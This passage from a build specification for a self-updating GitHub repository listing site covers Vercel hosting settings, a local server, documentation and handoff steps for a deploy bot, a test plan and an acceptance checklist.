- Pushes made with `GITHUB_TOKEN` do not trigger other workflows. Vercel's Git integration still deploys on that push.
- The daily commit itself counts as repo activity, which prevents GitHub's 60-day schedule auto-disable.

## 7. Hosting

### 7.1 Base-path independence

All asset references in `index.html` are relative (`styles.css`, `app.js`, `icon.svg`). JS imports are relative (`./lib/filter.js`). Data is resolved via `import.meta.url`. The app must work at `/`, at `/365-days/projects/day-005/`, and at `/365-days/projects/day-005` when served as `day-005.html` with `<base href="/365-days/projects/day-005/">`.

### 7.2 vercel.json

```json
{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "framework": null,
  "buildCommand": "",
  "installCommand": "",
  "outputDirectory": "dist",
  "cleanUrls": true,
  "headers": [
    { "source": "/data/(.*)", "headers": [{ "key": "Cache-Control", "value": "public, max-age=0, must-revalidate" }] },
    { "source": "/(.*)", "headers": [
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
      { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https://avatars.githubusercontent.com; connect-src 'self' https://raw.githubusercontent.com; base-uri 'self'; form-action 'none'; frame-ancestors 'self'" }
    ]}
  ]
}
```

### 7.3 `scripts/serve.mjs`

- `node:http` static server for `dist/` on `127.0.0.1:${PORT||4185}`.
- Sets MIME types for html, js, mjs, css, json, svg, and png, with `Cache-Control: no-store`.
- Emulates cleanUrls: `/foo` serves `foo.html` if it exists, and a directory serves its `index.html`.
- Resolves paths and rejects any that escape `dist` with 403. Missing paths get 404.
- Logs the URL on start.

## 8. Docs

### 8.1 README.md (rewrite; keep the original tagline as the first line under the title)

Sections:
1. What it is: one paragraph and one screenshot-free example card in text.
2. How it works: search → filter → install detection (summarise §4.4 priority) → `repos.json` → static UI.
3. Updates itself daily: the workflow, its time, the failure behaviour, and how to trigger it manually (Actions → daily-update → Run workflow).
4. Run locally:
   - `npm run serve` (or `node scripts/serve.mjs`)
   - `GITHUB_TOKEN=… npm run update`
   - `npm run seed` for offline use
   - `npm test`
   - `npm run validate`
5. Data schema: a link to BUILD.md §3.
6. Safety: commands are never executed. Spell out the allowlist plus the relation check.
7. Deploy: Vercel (summary) and rawmware Day 5 (see HANDOFF.md).

### 8.2 HANDOFF.md (for the deploy bot)

1. **Merge** `claude/github-repo-funnel-app-9wmfzv` into `main` (cron runs only on `main`).
2. **Vercel project:** import `rawmware/github.fetch` with Framework "Other". Root is the repo root, and `vercel.json` already sets the empty build/install and `outputDirectory: dist`. The production branch is `main`. There are no env vars.
3. **Actions:** under Settings → Actions → General → Workflow permissions, allow "Read and write" if the org restricts it. Run `daily-update` once via workflow_dispatch and confirm a `chore(data)` commit plus a Vercel redeploy.
4. **Embed on rawmware.com as Day 5:** in a rawmware.01 checkout, run `node scripts/export-rawmware.mjs <path-to-rawmware.01>`. It:
   - copies `dist/{index.html,styles.css,app.js,icon.svg,lib/,data/repos.json}` to `dist/365-days/projects/day-005/`
   - writes `dist/365-days/projects/day-005.html`, which is `index.html` with `<base href="/365-days/projects/day-005/">` inserted immediately after `<meta charset="utf-8">`
   - refuses to run unless the target has `vercel.json` and `dist/365-days/projects/`
   - never touches any other file

   The page then fetches the live snapshot from raw.githubusercontent.com, so the rawmware copy stays fresh with no redeploy. Verify `https://rawmware.com/365-days/projects/day-005` loads, shows a recent "last run", and has no console or CSP errors.
5. **Challenge manifest entry** (public challenge repo `challenge.json` and rawmware `docs/challenge.json`). Follow that repo's validator and its `days/day-005/` README pointer convention:

```json
{
  "day": 5,
  "date": "2026-10-02",
  "title": "github.fetch — Fresh Repos, One-Line Installs",
  "kind": "Website / Developer tool",
  "summary": "A self-updating funnel of the newest GitHub repositories people are starring, each paired with the simplest one-line install command, refreshed every morning by GitHub Actions.",
  "status": "published",
  "sourcePath": "days/day-005",
  "demoUrl": "https://rawmware.com/365-days/projects/day-005",
  "notes": [
    "A daily GitHub Actions job searches repositories created in the last 24 hours, 7 days and 30 days, filters spam, and detects the simplest install path from each README and manifest.",
    "Commands are displayed and copied, never executed; every command must match an allowlisted shape and reference the repository it installs.",
    "Source: https://github.com/rawmware/github.fetch"
  ]
}
```

## 9. Tests: `scripts/test.mjs` (node:test + node:assert/strict, no deps)

- Every §4.6 vector. Exercise detection through pure functions, with no network access:
  - `extractReadmeCandidates(markdown, ctx)`
  - `manifestCandidates(files, ctx)`, where `files` is `{ "package.json": string|null, … }` and `ctx` includes `npmVerified` / `pypiVerified` booleans
  - `assembleInstall(readmeCands, manifestCands, ctx)`
  - `isSafeCommand(cmd)`
- `normalizeRepo` on a seed item: topics null → `[]`, license string kept, and `ageDays`, `starsPerDay`, and `windows` correct for a fixed `snapshotAt`.
- The spam filter drops `"Free Robux generator 2026"` and keeps a normal description.
- `validateSnapshot` accepts a minimal valid snapshot. It rejects duplicate fullNames, a bad avatar host, an unsafe command, and a wrong clone string.
- `dist/lib/filter.js`: the window, language, family, and query filters, and each sort (including nulls last for gained-today). URL state round-trips.
- `dist/lib/format.js`: `compact(7341) === "7.3K"` (whatever `Intl` en-US yields; assert via `Intl` itself or the regex `/^7\.3K$/i`). Relative time for 3 h and 2 d.
- `export-rawmware.mjs` exports a pure `injectBase(html, href)`. Test that it inserts after the charset meta exactly once.
- Integration (no network): run `fetch-repos.mjs --seed scripts/fixtures/seed-search.json --no-probe --out <tmpdir>/repos.json --now 2026-10-03T05:00:00Z`. Assert exit 0, then assert `validateSnapshot(ok)` and `repos.length >= 20`.

## 10. First snapshot (Bot 2 must do this in the sandbox)

`api.github.com` is blocked in the sandbox, but `raw.githubusercontent.com` works.

1. Copy `/tmp/claude-0/-home-user-github-fetch/33c91655-7259-520c-9a60-93c92460756e/scratchpad/seed-search.json` to `scripts/fixtures/seed-search.json`.
2. Run `npm run seed` **with probing enabled**, so install detection really runs against raw READMEs and manifests. If registry hosts are blocked, they count as "not verified", which is expected.
3. Commit the resulting `dist/data/repos.json` and `dist/data/history/2026-10-03.json`. Expect `source.mode: "seed"`, about 55–60 repos, and an empty 24h window (the UI defaults to 7d, then 30d).
4. Report the `byMethod` summary in the final message.

## 11. Acceptance checklist (Bot 2 must satisfy; Bot 3 audits)

- [ ] File tree matches §2. `package.json` has no `dependencies` or `devDependencies`. No `node_modules`.
- [ ] `node --test scripts/test.mjs` passes, and every §4.6 vector is present.
- [ ] `node scripts/validate-data.mjs` passes on the committed `dist/data/repos.json` (seed mode, ≥ 20 repos, real install detection with at least some non-fallback primaries).
- [ ] `fetch-repos.mjs` uses only Node built-ins and implements every §4.1 flag and exit code. The live queries are exactly as in §4.2. A simulated total failure (for example, an invalid `--seed` path or < 20 repos) exits 1 and leaves the existing `repos.json` byte-identical.
- [ ] Writes are atomic, and history is pruned to 30 files.
- [ ] `isSafeCommand` and the relation check are implemented as in §4.4 and §4.5, and every emitted command passes them.
- [ ] `.github/workflows/daily-update.yml` matches §6 (cron `17 6 * * *`, workflow_dispatch, `contents: write`, commits only `dist/data`, no `[skip ci]`).
- [ ] `vercel.json` matches §7.2, and the site has no build step.
- [ ] `node scripts/serve.mjs` serves the app. The page renders cards, filters, sort, search, URL state, show-more, and copy (verify with a headless browser if one is available; otherwise via DOM-free unit tests plus manual curl of the assets).
- [ ] No `innerHTML`, `insertAdjacentHTML`, or `outerHTML` with data (`grep` clean except constant strings). No inline `style=`. No fragment-only hrefs except the JS-handled skip link.
- [ ] Works under a base path: the relative assets and `import.meta.url` data URL are verified by serving `dist` under a `/365-days/projects/day-005/` prefix (or by testing `injectBase` plus reasoning).
- [ ] Remote-mirror logic picks the newer `generatedAt`. Load-failure, empty-filter, empty-window, and stale states all exist.
- [ ] Layout has no horizontal scroll at 360px. Visible focus. Reduced motion is respected. Labels exist on all controls. Live regions are used for the count and copy.
- [ ] Day 5 branding: eyebrow, brand line, and `icon.svg` present.
- [ ] README.md (§8.1) and HANDOFF.md (§8.2, including the challenge entry JSON) written.
- [ ] Nothing in `/home/user/rawmware.01` modified. Nothing pushed to `main`.
